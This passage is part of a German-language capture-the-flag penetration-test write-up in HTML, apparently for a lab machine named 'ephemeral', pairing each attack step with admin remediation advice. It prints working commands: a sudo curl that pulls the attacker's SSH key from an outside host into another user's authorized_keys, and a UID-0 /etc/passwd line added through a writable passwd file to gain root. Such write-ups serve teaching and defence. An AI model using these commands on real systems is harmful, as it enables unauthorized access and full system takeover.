+                 3.  **Schlüssel herunterladen:** Der entscheidende Befehl wird ausgeführt: `sudo -u henry curl http://192.168.2.140/id_rsa.pub -o /home/henry/.ssh/authorized_keys`. Dieser Befehl läuft als `henry` und nutzt `curl`, um den öffentlichen Schlüssel des Angreifers vom Python-HTTP-Server herunterzuladen und direkt in die `authorized_keys`-Datei von `henry` zu schreiben. Die Option `-o` gibt die Ausgabedatei an.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Schritt 1 und 3 sind korrekt und führen zum Erfolg. Der Python-HTTP-Server stellt den Schlüssel bereit. Der `sudo curl`-Befehl schreibt den Angreifer-Schlüssel erfolgreich in `henry`s `authorized_keys`. Der `php://filter`-Versuch (Schritt 2) war ein Test, der die Grenzen von `curl` in diesem Kontext aufzeigte, aber für den erfolgreichen Angriff irrelevant war. Der HTTP-Server auf dem Angreifer-System protokolliert die erfolgreichen GET-Anfragen für `id_rsa.pub`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nachdem der Schlüssel erfolgreich platziert wurde, versuchen Sie sofort, sich per SSH als `henry@ephemeral.com` mit Ihrem eigenen privaten Schlüssel (normalerweise `~/.ssh/id_rsa`) anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die unsichere `sudo`-Regel für `curl` hat diese Eskalation ermöglicht. Entfernen Sie die Regel. Überprüfen Sie die `authorized_keys`-Dateien der Benutzer auf nicht autorisierte Einträge.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Angreifer-System (Kali): HTTP Server starten -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre>
+                     <!-- Log-Ausgaben des Servers erscheinen hier, wenn curl zugreift -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Zielsystem (als randy): Fehlgeschlagener Versuch -->
+                     <div class="prompt no-kali-prompt">randy@ephemeral:~$ <span class="command">sudo -u henry curl php://filter/convert.base64-encode/resource=/etc/passwd</span></div>
+                     <pre>curl: (1) Protocol "php" not supported or disabled in libcurl</pre>
+
+                     <!-- Auf Zielsystem (als randy): Erfolgreicher Befehl -->
+                     <div class="prompt no-kali-prompt">randy@ephemeral:~$ <span class="command">sudo -u henry curl http://192.168.2.140/id_rsa.pub -o /home/henry/.ssh/authorized_keys</span></div>
+                     <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   564  100   564    0     0  51272      0 --:--:-- --:--:-- --:--:-- 51272
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Angreifer-System (Kali): Log-Ausgaben des HTTP-Servers -->
+                     <pre>
+192.168.2.115 - - [04/Oct/2022 17:10:38] "GET /id_rsa.pub HTTP/1.1" 200 -
+192.168.2.115 - - [04/Oct/2022 17:11:15] "GET /id_rsa.pub HTTP/1.1" 200 - # Erfolgreicher Download durch curl
+192.168.2.115 - - [04/Oct/2022 17:11:34] "GET /id_rsa.pub HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester versucht nun, sich von seinem Kali-System aus als Benutzer `henry` per SSH anzumelden, wobei der eigene private Schlüssel (`/root/.ssh/id_rsa`) verwendet wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login ist erfolgreich! Das System fragt nach der Passphrase für den privaten Schlüssel (falls eine gesetzt ist). Nach Eingabe der Passphrase (oder wenn keine gesetzt ist) erhält der Angreifer eine Shell als Benutzer `henry`. Die horizontale Eskalation von `randy` zu `henry` ist abgeschlossen. Die User-Flag wird sofort mit `cat user.txt` gelesen: `<span class="password">9c8e36b0cb30f09300592cb56bca0c3a</span>`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> User-Flag gesichert. Beginnen Sie die Enumeration als `henry`, um Root-Rechte zu erlangen. Prüfen Sie `sudo -l`, suchen Sie nach SUID-Dateien, Cronjobs etc.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie den nicht autorisierten Schlüssel aus `/home/henry/.ssh/authorized_keys`. Beheben Sie die `sudo curl`-Schwachstelle.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh henry@ephemeral.com</span></div>
+                     <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="password">(Passphrase eingegeben)</span>
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-30-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+193 updates can be applied immediately.
+127 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+New release '22.04.1 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+Last login: Fri Jun 24 01:30:47 2022 from 10.0.0.69
+                     </pre>
+                     <div class="prompt no-kali-prompt">henry@ephemeral:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">9c8e36b0cb30f09300592cb56bca0c3a</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privesc-root">
+            <h2>Privilege Escalation (henry -> root)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `henry` werden weitere Enumerationsschritte durchgeführt:
+                *   `ss -tulpe`: Überprüfung der Netzwerkdienste.
+                *   `find / -type f -name .txt 2>/dev/null`: Suche nach Textdateien.
+                *   `find / -type f -perm -4000 -ls 2>/dev/null`: Suche nach SUID-Dateien.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   `ss`: Zeigt die üblichen Dienste (SSH, HTTP, CUPS, systemd-resolved, Avahi/mDNS). Nichts Ungewöhnliches.
+                *   `find *.txt`: Findet nur die bereits gelesene `user.txt`.
+                *   `find SUID`: Listet eine sehr lange Liste von SUID-Dateien auf. Viele davon sind Standard (`passwd`, `sudo`, `su`, `mount` etc.). Auffällig sind die Einträge für VMware Tools (`vmware-user-suid-wrapper`) sowohl unter `/usr/lib` als auch im Pfad `/home/randy/Desktop/vmware-tools-distrib`. Außerdem gibt es viele SUID-Dateien unter `/snap/core20/`. Obwohl die VMware-Einträge interessant aussehen, gibt es keinen offensichtlichen, einfachen Exploit in dieser Liste. Die große Anzahl an SUID-Dateien (insbesondere durch Snap) erhöht potenziell die Angriffsfläche, erfordert aber genauere Analyse.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da die SUID-Suche keine sofortige Lösung bietet, prüfen Sie andere Vektoren: `sudo -l` für `henry`, Cronjobs, Kernel-Exploits, Konfigurationsdateien, Schreibrechte in unerwarteten Verzeichnissen. Die VMware-Tools könnten ein Ansatzpunkt sein, falls eine bekannte Schwachstelle existiert.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID-Binaries. Entfernen Sie unnötige Software (wie die VMware Tools-Distribution im Home-Verzeichnis). Halten Sie Snap-Pakete und das Basissystem aktuell.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">henry@ephemeral:~$ <span class="command">ss -tulpe</span></div>
+                     <pre>
+Netid    State      Recv-Q     Send-Q                              Local Address:Port                 Peer Address:Port    Process
+udp      UNCONN     0          0                                         0.0.0.0:631                       0.0.0.0:*        users:(("cups-browsed",pid=759,fd=7)) ino:24895 sk:1 <->
+udp      UNCONN     0          0                                         0.0.0.0:59406                     0.0.0.0:*        users:(("avahi-daemon",pid=716,fd=12)) uid:115 ino:23713 sk:2 <->
+udp      UNCONN     0          0                                   127.0.0.53%lo:53                        0.0.0.0:*        users:(("systemd-resolve",pid=665,fd=13)) uid:101 ino:21036 sk:3 <->
+udp      UNCONN     0          0                                         0.0.0.0:5353                      0.0.0.0:*        users:(("avahi-daemon",pid=716,fd=10)) uid:115 ino:23711 sk:4 <->
+udp      UNCONN     0          0                                            [::]:43547                        [::]:*        users:(("avahi-daemon",pid=716,fd=13)) uid:115 ino:23714 sk:5 v6only:1 <->
+udp      UNCONN     0          0             [fe80::9584:5107:a9d6:d56a]%enp0s17:546                         [::]:*        users:(("NetworkManager",pid=706,fd=24)) ino:26209 sk:6 v6only:1 <->
+udp      UNCONN     0          0                                            [::]:5353                         [::]:*        users:(("avahi-daemon",pid=716,fd=11)) uid:115 ino:23712 sk:7 v6only:1 <->
+tcp      LISTEN     0          4096                                127.0.0.53%lo:53                        0.0.0.0:*        users:(("systemd-resolve",pid=665,fd=14)) uid:101 ino:21037 sk:8 <->
+tcp      LISTEN     0          128                                       0.0.0.0:22                        0.0.0.0:*        users:(("sshd",pid=780,fd=3)) ino:25075 sk:9 <->
+tcp      LISTEN     0          5                                       127.0.0.1:631                       0.0.0.0:*        users:(("cupsd",pid=758,fd=7)) ino:24370 sk:a <->
+tcp      LISTEN     0          511                                          [::]:80                           [::]:*        users:(("apache2",pid=810,fd=4),("apache2",pid=809,fd=4),("apache2",pid=808,fd=4),("apache2",pid=807,fd=4),("apache2",pid=806,fd=4),("apache2",pid=783,fd=4)) ino:25291 sk:b v6only:0 <->
+tcp      LISTEN     0          128                                          [::]:22                           [::]:*        users:(("sshd",pid=780,fd=4)) ino:25077 sk:c v6only:1 <->
+tcp      LISTEN     0          5                                           [::1]:631                          [::]:*        users:(("cupsd",pid=758,fd=6)) ino:24369 sk:d v6only:1 <->
+                     </pre>
+                     <div class="prompt no-kali-prompt">henry@ephemeral:~$ <span class="command">find / -type f -name \*.txt 2>/dev/null</span></div>
+                     <pre>/home/henry/user.txt</pre>
+                     <div class="prompt no-kali-prompt">henry@ephemeral:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   139769    388 -rwsr-xr--   1 root     dip        395144 Jul 23  2020 /usr/sbin/pppd
+   131900     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp
+   131970     68 -rwsr-xr-x   1 root     root        68208 Jul 14  2021 /usr/bin/passwd
+   131865     56 -rwsr-xr-x   1 root     root        55528 Feb  7  2022 /usr/bin/mount
+   131254     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn
+   131522     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd
+   132245    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
+   131444     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
+   131260     52 -rwsr-xr-x   1 root     root        53040 Jul 14  2021 /usr/bin/chsh
+   132340     40 -rwsr-xr-x   1 root     root        39144 Feb  7  2022 /usr/bin/umount
+   132244     68 -rwsr-xr-x   1 root     root        67816 Feb  7  2022 /usr/bin/su
+   133256     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   131397    464 -rwsr-xr-x   1 root     root         473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
+   524947     16 -r-sr-xr-x   1 root     root          13628 Jun 23 20:08 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+   524972     16 -r-sr-xr-x   1 root     root          14320 Jun 23 20:08 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+   139317     16 -rwsr-sr-x   1 root     root          14488 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
+   137551    140 -rwsr-xr-x   1 root     root         142696 Feb 18  2022 /usr/lib/snapd/snap-confine
+   133574     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+   137361     24 -rwsr-xr-x   1 root     root          22840 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+  1203327     16 -rwsr-xr-x   1 root     root          13628 Jun 13  2019 /home/randy/Desktop/vmware-tools-distrib/lib/bin32/vmware-user-suid-wrapper
+  1203277     16 -rwsr-xr-x   1 root     root          14320 Jun 13  2019 /home/randy/Desktop/vmware-tools-distrib/lib/bin64/vmware-user-suid-wrapper
+      812     84 -rwsr-xr-x   1 root     root          85064 Mar 14  2022 /snap/core20/1518/usr/bin/chfn
+      818     52 -rwsr-xr-x   1 root     root          53040 Mar 14  2022 /snap/core20/1518/usr/bin/chsh
+      887     87 -rwsr-xr-x   1 root     root          88464 Mar 14  2022 /snap/core20/1518/usr/bin/gpasswd
+      971     55 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /snap/core20/1518/usr/bin/mount
+      980     44 -rwsr-xr-x   1 root     root          44784 Mar 14  2022 /snap/core20/1518/usr/bin/newgrp
+      993     67 -rwsr-xr-x   1 root     root          68208 Mar 14  2022 /snap/core20/1518/usr/bin/passwd
+     1102     67 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /snap/core20/1518/usr/bin/su
+     1103    163 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /snap/core20/1518/usr/bin/sudo
+     1161     39 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /snap/core20/1518/usr/bin/umount
+     1248     51 -rwsr-xr--   1 root     systemd-resolve    51344 Apr 29 08:03 /snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     1620    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1518/usr/lib/openssh/ssh-keysign
+      811     84 -rwsr-xr-x   1 root     root               85064 Mar 14  2022 /snap/core20/1623/usr/bin/chfn
+      817     52 -rwsr-xr-x   1 root     root               53040 Mar 14  2022 /snap/core20/1623/usr/bin/chsh
+      886     87 -rwsr-xr-x   1 root     root               88464 Mar 14  2022 /snap/core20/1623/usr/bin/gpasswd
+      970     55 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 /snap/core20/1623/usr/bin/mount
+      979     44 -rwsr-xr-x   1 root     root               44784 Mar 14  2022 /snap/core20/1623/usr/bin/newgrp
+      994     67 -rwsr-xr-x   1 root     root               68208 Mar 14  2022 /snap/core20/1623/usr/bin/passwd
+     1104     67 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 /snap/core20/1623/usr/bin/su
+     1105    163 -rwsr-xr-x   1 root     root              166056 Jan 19  2021 /snap/core20/1623/usr/bin/sudo
+     1163     39 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 /snap/core20/1623/usr/bin/umount
+     1252     51 -rwsr-xr--   1 root     systemd-resolve    51344 Apr 29 08:03 /snap/core20/1623/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     1624    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1623/usr/lib/openssh/ssh-keysign
+      136    121 -rwsr-xr-x   1 root     root              123560 May 19 10:01 /snap/snapd/16010/usr/lib/snapd/snap-confine
+      136    121 -rwsr-xr-x   1 root     root              123560 Sep  2 13:21 /snap/snapd/17029/usr/lib/snapd/snap-confine
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Auf dem Angreifer-System wird `mkpasswd` verwendet, um einen SHA-512-Passwort-Hash für ein neues Passwort zu generieren. Anschließend wird eine vollständige `/etc/passwd`-Zeile für einen neuen Benutzer `hacker` erstellt, der diesen Hash und die UID/GID 0 (Root-Rechte) hat.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Dies ist die Vorbereitung für den finalen Angriff. Es wird ein neuer Root-Benutzer (`hacker`) mit einem bekannten Passwort (bzw. dessen Hash) definiert. Die Zeile `hacker:$6$TOXNDenJvlz3buw8$...:0:0:root:/root:/bin/bash` ist korrekt formatiert für `/etc/passwd`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Fügen Sie diese Zeile zur `/etc/passwd`-Datei auf dem Zielsystem hinzu. Dies erfordert Schreibrechte auf `/etc/passwd`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Das Generieren von Passwort-Hashes ist ein normaler administrativer Vorgang, aber das Ziel, dies in `/etc/passwd` einzufügen, ist bösartig. Überwachen Sie Änderungen an `/etc/passwd`.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Angreifer-System (Kali) -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mkpasswd -m sha-512</span></div>
+                     <pre>
+Passwort: <span class="password">(Passwort wird eingegeben)</span>
+$6$TOXNDenJvlz3buw8$xzS03JL0./xkxFI3VJcGAjJwHLBC/nCnh4NHzBjx99B92Ti53iHBTpgykyP5Ah3yctgSecn0DTxKzqo7jcStK.
+                     </pre>
+                     <!-- Manuell erstellte /etc/passwd Zeile -->
+                     <pre>
+# Ziel-Zeile für /etc/passwd:
+hacker:$6$TOXNDenJvlz3buw8$xzS03JL0./xkxFI3VJcGAjJwHLBC/nCnh4NHzBjx99B92Ti53iHBTpgykyP5Ah3yctgSecn0DTxKzqo7jcStK.:0:0:root:/root:/bin/bash
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+            <h2>Proof of Concept (henry -> root via /etc/passwd modification)</h2>
+             <p class="analysis">
+                 <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert, wie Schreibrechte auf die Datei `/etc/passwd` für den Benutzer `henry` ausgenutzt werden, um einen neuen Benutzer mit Root-Rechten (UID 0) hinzuzufügen und somit vollständigen Root-Zugriff auf das System zu erlangen.
+             </p>
+            <p class="evaluation">
+                <strong>Voraussetzungen:</strong>
+                *   Zugriff als Benutzer `henry`.
+                *   Schreibrechte für `henry` auf die Datei `/etc/passwd`.
+                *   Ein vorbereiteter `/etc/passwd`-Eintrag für einen neuen Root-Benutzer (z.B. `hacker`) mit bekanntem Passwort-Hash.
+            </p>
+
+            <p class="analysis">
+                <strong>Schritt 1: Überprüfung der Schreibrechte</strong><br>
+                Als Benutzer `henry` werden die Berechtigungen der Datei `/etc/passwd` überprüft.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Schritt 1):</strong> Der Befehl `ls -la /etc/passwd` zeigt `-rw-rw-r-- 1 root henry 2891 Jun 24 01:36 /etc/passwd`. Dies ist der kritische Punkt: Die Datei gehört zwar `root`, aber die **Gruppe `henry` hat Schreibrechte (`rw-`)**. Da der Benutzer `henry` Mitglied seiner eigenen Gruppe ist, hat er somit Schreibrechte auf `/etc/passwd`. Dies ist eine schwerwiegende Fehlkonfiguration.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Die Schreibrechte sind bestätigt. Fahren Sie mit dem Bearbeiten der Datei fort.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität!** Korrigieren Sie sofort die Berechtigungen von `/etc/passwd`. Sie sollten typischerweise `-rw-r--r--` sein und `root:root` gehören. Diese Fehlkonfiguration ermöglicht jedem Mitglied der Gruppe `henry` (wahrscheinlich nur `henry` selbst) die vollständige Übernahme des Systems. Untersuchen Sie, warum diese Berechtigungen so gesetzt wurden.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">henry@ephemeral:/tmp$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre>-rw-rw-r-- 1 root henry 2891 Jun 24 01:36 /etc/passwd</pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Schritt 2: Modifizieren von `/etc/passwd`</strong><br>
+                 1.  `vi t.txt` (oder `nano t.txt`): Eine temporäre Datei wird erstellt (dieser Schritt scheint im Log überflüssig, eventuell nur zum Testen des Editors).
+                 2.  `nano /etc/passwd`: Die Datei `/etc/passwd` wird mit einem Texteditor (hier `nano`) geöffnet.
+                 3.  Die zuvor vorbereitete Zeile für den `hacker`-Benutzer (`hacker:$6$HASH...:0:0:root:/root:/bin/bash`) wird am Ende der Datei hinzugefügt.
+                 4.  Die Datei wird gespeichert.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung (Schritt 2):</strong> Durch die Schreibrechte kann `henry` die Datei `/etc/passwd` erfolgreich bearbeiten und den neuen Root-Benutzer `hacker` hinzufügen.
+            </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Die Datei ist modifiziert. Wechseln Sie nun mit `su hacker` zum neuen Benutzer.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Wie oben: Berechtigungen korrigieren. Änderungen an `/etc/passwd` überwachen.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt no-kali-prompt">henry@ephemeral:/tmp$ <span class="command">vi t.txt</span></div>
+                    <!-- Editor wird verwendet und geschlossen -->
+                    <div class="prompt no-kali-prompt">henry@ephemeral:/tmp$ <span class="command">nano /etc/passwd</span></div>
+                    <!-- Die Zeile für 'hacker' wird hinzugefügt und die Datei gespeichert -->
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Schritt 3: Erlangen der Root-Shell</strong><br>
+                Nachdem der `hacker`-Benutzer zu `/etc/passwd` hinzugefügt wurde, wird versucht, mit `su hacker` zu diesem Benutzer zu wechseln. Das zuvor generierte Passwort wird eingegeben.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung (Schritt 3):</strong> Erfolg! Der Befehl `su hacker` funktioniert nach Eingabe des korrekten Passworts. Der Prompt wechselt zu `root@ephemeral:/tmp#`. Der Benutzer `henry` hat Root-Rechte erlangt, indem er die Schreibrechte auf `/etc/passwd` ausgenutzt hat. Fantastisch, das Endziel ist erreicht! Die Root-Flag wird anschließend mit `cd ~` und `cat root.txt` gelesen.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Root-Zugriff bestätigt. Root-Flag gesichert. Dokumentieren Sie den Pfad.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> System kompromittiert. Notfallmaßnahmen einleiten. Die Fehlkonfiguration der Dateiberechtigungen von `/etc/passwd` war der letzte entscheidende Schritt und muss behoben werden. Stellen Sie die originale `/etc/passwd` wieder her.
+             </p>
+             <p class="evaluation">
+                 <strong>Risikobewertung:</strong> Die Kombination aus einer alten, aber ausnutzbaren Schwachstelle (schwache SSH-Schlüssel), einer unsicheren `sudo`-Regel (`curl`) und einer kritischen Fehlkonfiguration der Dateiberechtigungen (`/etc/passwd`) ermöglichte die vollständige Kompromittierung des Systems. Das Risiko ist **kritisch**.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">henry@ephemeral:/tmp$ <span class="command">su hacker</span></div>
+                     <pre>Password:</pre> <span class="password">(Passwort wird eingegeben)</span>
+                     <div class="prompt root-prompt">root@ephemeral:/tmp# </div> <!-- Root-Zugriff! -->
+                     <div class="prompt root-prompt">root@ephemeral:/tmp# <span class="command">cd ~</span></div>
+                     <div class="prompt root-prompt">root@ephemeral:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">b0a3dec84d09f03615f768c8062cec4d</span></pre>
+                 </div>
+             </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Die User-Flag wurde als `henry`, die Root-Flag als `root` (nach `su hacker`) gelesen.
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Beide Flags wurden erfolgreich extrahiert.
+                 </p>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/henry/user.txt</div>
+                     <div class="flag-value"><span class="password">9c8e36b0cb30f09300592cb56bca0c3a</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">b0a3dec84d09f03615f768c8062cec4d</span></div>
+                 </div>
+             </div>
+         </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-10-04</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
